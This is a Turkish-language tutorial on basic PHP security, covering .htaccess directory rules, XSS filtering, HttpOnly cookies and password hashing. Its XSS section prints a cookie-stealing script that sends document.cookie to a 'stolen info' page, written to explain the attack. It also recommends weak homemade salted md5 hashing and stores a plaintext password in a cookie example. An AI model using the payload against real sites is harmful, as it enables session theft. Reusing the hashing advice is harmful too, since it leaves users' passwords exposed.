## PHP'DE GÜVENLİK

- [Önsöz](https://github.com/cicekhasan/DersNotlarim)


1. Dosya uzantıları kesinlikle "php" olmalı. Tarayıcılar php uzantılı dosyalardaki, php etiketlerinin arasındaki kodları kesinlikle göstermez!,
2. .htaccess dosyası ile dizindeki dosyaların listelenmesini engelle!

Dizinin altında bir .htaccess dosyası oluşturup ve en üst satırına;

```bash 
# (php.ini gibi bazı dosyalar halen açıllır!)
Options -Indexes
# ya da (php.ini gibi bazı dosyalar halen açıllır!)
Options All -Indexes
# ya da (php.ini açılmaz!)
deny from all
```

yazarsak dizinlerin görüntülenmesini engelleyebiliriz. "deny from all" ı her dizin altında yaparsak bizde istediğimz klasörlere erişemeyiz. Bunu sadece gerekli yerlerde kullanıp, diğer dosyalar için "Options -Indexes" ı kullanmalıyız.

3. XSS Cross-site scripting açığını engelle! Kullanıcıdan aldığın bilgileri filtrele. Kullanıcı bir script yazarsa zor durumda kalabilirsin! Kullanıcıdan alınan bilgileri ```htmlspecialchars();``` ile filitreliyebilirsiniz. ```htmlspecialchars();``` script etiketlerindeki karakterleri metin formatına çevirerek yapılmak istenen işlemi bozar. Tarayıcı konsolundan "document.cookie" komutunu gönderirsek kayıtlı cookie lere ulaşabiliriz.

```bash
<script>
  window.location.href = 'calinanBilgiler.php?cookie=' + document.cookie;
</script>
```
Filtreyi gösterirken kaldırmak için ```htmlspecialchars_decode();``` kullanabilirsiniz. Bu içerik kayıt ve göstermek için gereklidir.

cookie yoluyla bilgileri sağlama almak için farklı bir yol olarak da; cookie oluştururken ```httpOnly Cookie``` parametresini true yaparsak güvenliği(XSS) sağlamış oluruz! HttpOnly Cookie'yi devreye aldığımızda java script codu olan "document.cookie" ile o verinin görülmesini engellemiş oluruz, bilgiler sadece server tarafında görülebilir olur!!!

```php
# php.net orjinal setcookie kullanımı...
setcookie ( string $name [, string $value = "" [, int $expires = 0 [, string $path = "" [, 
  string $domain = "" [, bool $secure = FALSE [, bool $httponly = FALSE ]]]]]] );
# Sondaki parametre ile "httpOnly Cookie"'yi devreye alıyoruz!
setcookie('parola', 'hasancicek', strtotime('+1 day'), '/', null, null, true);
```

4. Parolaları şifreleyerek veritabanına kaydedin. En sık kulanılan şifreleme şekli ```md5('$parola');``` şeklindedir. md5 kırılabildiği için, veritabanına kayıt ederken php'nin sunduğu ```password_has();``` fonksiyonunu ve kullanıcı girerken de kontrol etmek için ```password_verify();``` fonksiyonunu kullanarak güvenliği sağlamış olursunuz.

Bu fonksiyonları kullanmadan da, kayıt olurken kullanıcının girdiği parolanın başına ve sonuna çeşitli karakterler ekleyerek de güvenliği kendiniz sağayabilirsiniz. Örneğin;

```php
<?php

$string = array("A","a","0","B","b","C","c","D","1","d","E","e","F","3","f","G","g",
    "H","h","4","J","j","K","k","L","l","M","m","N","n","O","6","o","P","p","5","R",
    "r","S","s","T","7","t","U","u","V","v","8","Y","y","Z","9","z","W","w","Q","q","2");

$test = array_rand($string, 8);

$cikti1  = $string[$test['0']];
$cikti1 .= $string[$test['1']];
$cikti1 .= $string[$test['2']];
$cikti1 .= $string[$test['3']];


$cikti2 .= $string[$test['4']];
$cikti2 .= $string[$test['5']];
$cikti2 .= $string[$test['6']];
$cikti2 .= $string[$test['7']];

$parola = md5($cikti1.'hasancicek'.$cikti2);

echo "Gizli Parola: ".$parola;

?>
``` 

Örnekte "hasancicek" olan asıl parolanın başına ve sonuna karışık dört karakter koydup md5 ile şifreledik. Bu şekilde kullanıcının asıl parolasını gislemiş olduk. Yalnız, parola kayıt sırasında başına ve sonuna koyduğumuz bu karakterleri de veritabanına kayıt etmemiz gerekir. Neden kullanıcı giriş yaparken de aynı karakterleri ekleyelim ki giriş başarılı olsun. Bir fikir siz dahafarklı yollar deneyebilirsiniz. Örneğin sadece başına bir iki karakter eklemeniz bile yeterli olabilir. Ya da kayıt sırasındabaşına elektronik postasını ekledikden sonra hasleyebilirsiniz. giriş sırasında da zaten elektronik postasını kayıt ettiğiniz için giriş işlemini düzgünce gerçekleştirebilirsiniz. Mesela...
